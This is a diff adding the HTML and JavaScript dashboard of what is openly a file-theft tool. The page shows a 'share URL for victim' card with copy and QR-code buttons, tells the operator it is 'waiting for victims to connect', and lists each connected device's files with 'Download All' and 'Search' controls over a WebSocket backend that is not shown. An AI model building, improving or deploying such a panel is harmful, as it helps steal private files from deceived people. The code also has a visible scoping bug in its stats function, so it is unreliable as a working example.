@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎮 WEB MANAGER PRO - Professional Dashboard</title>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a;
+            color: #eee;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 25px 20px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+        
+        .header h1 { font-size: 32px; margin-bottom: 5px; }
+        .header p { opacity: 0.9; font-size: 14px; }
+        
+        .stats-bar {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            padding: 20px;
+            background: #1a1a1a;
+            border-bottom: 1px solid #333;
+        }
+        
+        .stat-card {
+            background: #16213e;
+            padding: 15px;
+            border-radius: 12px;
+            border-left: 4px solid #667eea;
+            text-align: center;
+        }
+        
+        .stat-value { font-size: 24px; font-weight: bold; color: #667eea; }
+        .stat-label { font-size: 12px; color: #888; margin-top: 5px; }
+        
+        .url-card {
+            background: #1a1a2e;
+            margin: 20px;
+            padding: 25px;
+            border-radius: 16px;
+            text-align: center;
+            border: 1px solid #0f3460;
+        }
+        
+        .url-card h3 { color: #667eea; margin-bottom: 15px; }
+        
+        .url-box {
+            background: #0f3460;
+            padding: 15px;
+            border-radius: 12px;
+            font-family: monospace;
+            font-size: 14px;
+            word-break: break-all;
+            margin: 15px 0;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            padding: 10px 25px;
+            border-radius: 8px;
+            border: none;
+            color: white;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        
+        .btn-primary { background: #4CAF50; }
+        .btn-primary:hover { background: #45a049; transform: translateY(-2px); }
+        
+        .btn-secondary { background: #2196F3; }
+        .btn-secondary:hover { background: #0b7dda; transform: translateY(-2px); }
+        
+        .devices-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+        
+        .device-card {
+            background: #16213e;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid #0f3460;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            transition: all 0.3s;
+        }
+        
+        .device-card:hover { 
+            border-color: #667eea;
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.2);
+        }
+        
+        .device-header {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #0f3460;
+        }
+        
+        .device-info h3 { font-size: 18px; margin-bottom: 5px; }
+        .device-info p { font-size: 12px; color: #888; }
+        
+        .status-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #4CAF50;
+            animation: pulse 2s infinite;
+            box-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
+        }
+        
+        .status-dot.offline {
+            background: #f44336;
+            animation: none;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        .device-stats {
+            padding: 15px;
+            background: #0f3460;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            font-size: 12px;
+            text-align: center;
+        }
+        
+        .device-stats > div {
+            padding: 8px;
+            background: #1a1a2e;
+            border-radius: 6px;
+        }
+        
+        .device-stats strong { color: #667eea; display: block; }
+        
+        .device-toolbar {
+            padding: 12px 15px;
+            background: #0f3460;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            border-top: 1px solid #16213e;
+        }
+        
+        .device-toolbar button {
+            padding: 6px 14px;
+            background: #1a1a2e;
+            border: 1px solid #667eea;
+            border-radius: 6px;
+            color: #667eea;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.2s;
+        }
+        
+        .device-toolbar button:hover {
+            background: #667eea;
+            color: white;
+        }
+        
+        .file-browser {
+            padding: 15px;
+            max-height: 400px;
+            overflow-y: auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
+            gap: 12px;
+        }
+        
+        .file-item {
+            background: #0f3460;
+            padding: 12px;
+            border-radius: 10px;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.2s;
+            border: 1px solid transparent;
+        }
+        
+        .file-item:hover {
+            background: #1a4a7a;
+            border-color: #667eea;
+            transform: translateY(-3px);
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.2);
+        }
+        
+        .file-icon { font-size: 40px; margin-bottom: 8px; }
+        .file-name { font-size: 11px; word-break: break-word; color: #ccc; }
+        .file-size { font-size: 9px; color: #888; margin-top: 4px; }
+        
+        .loading {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+            color: #888;
+        }
+        
+        .spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid #333;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        .empty-msg {
+            text-align: center;
+            padding: 40px;
+            color: #888;
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #4CAF50;
+            color: white;
+            padding: 15px 25px;
+            border-radius: 8px;
+            z-index: 1000;
+            animation: fadeOut 3s forwards;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+        
+        .toast.error { background: #f44336; }
+        
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            70% { opacity: 1; }
+            100% { opacity: 0; visibility: hidden; }
+        }
+        
+        @media (max-width: 700px) {
+            .devices-grid { grid-template-columns: 1fr; }
+            .stats-bar { grid-template-columns: repeat(2, 1fr); }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🎮 WEB MANAGER PRO - Professional Dashboard</h1>
+        <p>Real-Time File Access • WebSocket Streaming • Stable Connection</p>
+    </div>
+
+    <div class="stats-bar">
+        <div class="stat-card">
+            <div class="stat-value" id="connectedCount">0</div>
+            <div class="stat-label">Connected Devices</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="totalFiles">0</div>
+            <div class="stat-label">Total Files</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="totalSize">0 GB</div>
+            <div class="stat-label">Total Storage</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-value" id="uptime">0s</div>
+            <div class="stat-label">Uptime</div>
+        </div>
+    </div>
+
+    <div class="url-card">
+        <h3>🔗 SHARE URL FOR VICTIM</h3>
+        <div class="url-box" id="shareUrl">Generating URL...</div>
+        <div class="btn-group">
+            <button class="btn btn-primary" onclick="copyUrl()">📋 Copy URL</button>
+            <button class="btn btn-secondary" onclick="generateNewUrl()">🔄 New URL</button>
+            <button class="btn btn-secondary" onclick="showQR()">📱 QR Code</button>
+        </div>
+    </div>
+
+    <div class="devices-grid" id="devicesGrid">
+        <div class="empty-msg">📱 Waiting for victims to connect...<br>Share the URL above to get started!</div>
+    </div>
+
+    <script>
+        let currentUrl = '';
+        let devices = {};
+        let socket = null;
+        let startTime = Date.now();
+
+        // Initialize Socket.IO
+        function initSocket() {
+            socket = io();
+
+            socket.on('connect', () => {
+                console.log('✅ WebSocket connected');
+                socket.emit('controller_register');
+                loadDevices();
+            });
+
+            socket.on('device_connected', (data) => {
+                console.log('📱 Device connected:', data.device_id);
+                devices[data.device_id] = data.device;
+                renderDevices();
+            });
+
+            socket.on('files_updated', (data) => {
+                console.log('📊 Files updated:', data.device_id);
+                if (devices[data.device_id]) {
+                    devices[data.device_id].files = data.files;
+                }
+                renderDevices();
+            });
+
+            socket.on('error', (data) => {
+                showToast('Error: ' + data.message, 'error');
+            });
+        }
+
+        async function getShareUrl() {
+            try {
+                const response = await fetch('/api/get_share_url');
+                const data = await response.json();
+                currentUrl = data.url;
+                document.getElementById('shareUrl').innerHTML = currentUrl;
+            } catch (error) {
+                showToast('Failed to generate URL', 'error');
+            }
+        }
+
+        async function generateNewUrl() {
+            await getShareUrl();
+            showToast('New URL generated!');
+        }
+
+        function copyUrl() {
+            navigator.clipboard.writeText(currentUrl);
+            showToast('URL copied to clipboard!');
+        }
+
+        function showQR() {
+            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(currentUrl)}`;
+            alert('QR Code URL: ' + qrUrl);
+        }
+
+        async function loadDevices() {
+            try {
+                const response = await fetch('/api/get_devices');
+                const data = await response.json();
+                devices = data.devices;
+                renderDevices();
+            } catch (error) {
+                console.error('Failed to load devices:', error);
+            }
+        }
+
+        function renderDevices() {
+            const grid = document.getElementById('devicesGrid');
+            const deviceList = Object.values(devices);
+
+            if (deviceList.length === 0) {
+                grid.innerHTML = '<div class="empty-msg">📱 Waiting for victims to connect...<br>Share the URL above!</div>';
+                return;
+            }
+
+            grid.innerHTML = deviceList.map(device => `
+                <div class="device-card">
+                    <div class="device-header">
+                        <div class="device-info">
+                            <h3>📱 ${escapeHtml(device.name)}</h3>
+                            <p>${new Date(device.connected_at).toLocaleString()}</p>
+                        </div>
+                        <div class="status-badge">
+                            <div class="status-dot ${device.status === 'offline' ? 'offline' : ''}"></div>
+                            <button onclick="removeDevice('${device.id}')" style="
+                                background: #f44336;
+                                border: none;
+                                padding: 5px 12px;
+                                border-radius: 6px;
+                                color: white;
+                                cursor: pointer;
+                                font-size: 12px;
+                            ">✕ Disconnect</button>
+                        </div>
+                    </div>
+
+                    <div class="device-stats">
+                        <div>
+                            <strong>${device.file_count || 0}</strong>
+                            Files
+                        </div>
+                        <div>
+                            <strong>${formatBytes(device.total_size || 0)}</strong>
+                            Storage
+                        </div>
+                        <div>
+                            <strong>${device.status === 'connected' ? '🟢 Online' : '🔴 Offline'}</strong>
+                            Status
+                        </div>
+                    </div>
+
+                    <div class="device-toolbar">
+                        <button onclick="loadFiles('${device.id}')">🏠 Refresh</button>
+                        <button onclick="downloadAll('${device.id}')">📥 Download All</button>
+                        <button onclick="searchFiles('${device.id}')">🔍 Search</button>
+                    </div>
+
+                    <div class="file-browser">
+                        ${device.files && device.files.length > 0 ? 
+                            device.files.slice(0, 20).map(file => `
+                                <div class="file-item" title="${file.name}">
+                                    <div class="file-icon">${file.is_dir ? '📁' : getFileIcon(file.name)}</div>
+                                    <div class="file-name">${truncate(file.name, 12)}</div>
+                                    <div class="file-size">${file.is_dir ? '' : formatBytes(file.size)}</div>
+                                </div>
+                            `).join('')
+                            : '<div class="empty-msg" style="grid-column: 1/-1;">No files yet...</div>'
+                        }
+                    </div>
+                </div>
+            `).join('');
+
+            updateStats();
+        }
+
+        function updateStats() {
+            const devices = Object.values(devices);
+            const connected = devices.filter(d => d.status === 'connected').length;
+            const totalFiles = devices.reduce((sum, d) => sum + (d.file_count || 0), 0);
+            const totalSize = devices.reduce((sum, d) => sum + (d.total_size || 0), 0);
+            const uptime = Math.floor((Date.now() - startTime) / 1000);
+
+            document.getElementById('connectedCount').textContent = connected;
+            document.getElementById('totalFiles').textContent = totalFiles;
+            document.getElementById('totalSize').textContent = formatBytes(totalSize);
+            document.getElementById('uptime').textContent = formatTime(uptime);
+        }
+
+        async function loadFiles(deviceId) {
+            try {
+                const response = await fetch(`/api/get_files/${deviceId}`);
+                const data = await response.json();
+                if (devices[deviceId]) {
+                    devices[deviceId].files = data.files;
+                    renderDevices();
+                }
+                showToast('Files refreshed!');
+            } catch (error) {
+                showToast('Failed to load files', 'error');
+            }
+        }
+
+        async function removeDevice(deviceId) {
+            if (confirm('Disconnect this device?')) {
+                try {
+                    await fetch(`/api/remove_device/${deviceId}`, { method: 'POST' });
+                    delete devices[deviceId];
+                    renderDevices();
+                    showToast('Device disconnected');
+                } catch (error) {
+                    showToast('Failed to disconnect', 'error');
+                }
+            }
+        }
+
+        function showToast(message, type = 'success') {
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+
+        function formatBytes(bytes) {
+            if (bytes === 0) return '0 B';
+            const k = 1024;
+            const sizes = ['B', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return (bytes / Math.pow(k, i)).toFixed(1) + ' ' + sizes[i];
+        }
+
+        function formatTime(seconds) {
+            const hours = Math.floor(seconds / 3600);
+            const minutes = Math.floor((seconds % 3600) / 60);
+            if (hours > 0) return `${hours}h ${minutes}m`;
+            return `${minutes}m ${seconds % 60}s`;
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function truncate(str, length) {
+            return str.length > length ? str.substring(0, length) + '...' : str;
+        }
+
+        function getFileIcon(filename) {
+            const ext = filename.split('.').pop().toLowerCase();
+            const icons = {
+                'jpg':'🖼️', 'jpeg':'🖼️', 'png':'🖼️', 'gif':'🖼️',
+                'mp4':'🎬', 'mp3':'🎵', 'wav':'🎵',
+                'pdf':'📄', 'doc':'📝', 'docx':'📝', 'txt':'📝',
+                'zip':'📦', 'rar':'📦', '7z':'📦',
+                'py':'🐍', 'js':'📜', 'html':'🌐', 'css':'🎨'
+            };
+            return icons[ext] || '📄';
+        }
+
+        // Initialize
+        initSocket();
+        getShareUrl();
+        setInterval(loadDevices, 5000);
+        setInterval(updateStats, 1000);
+    </script>
+</body>
+</html>
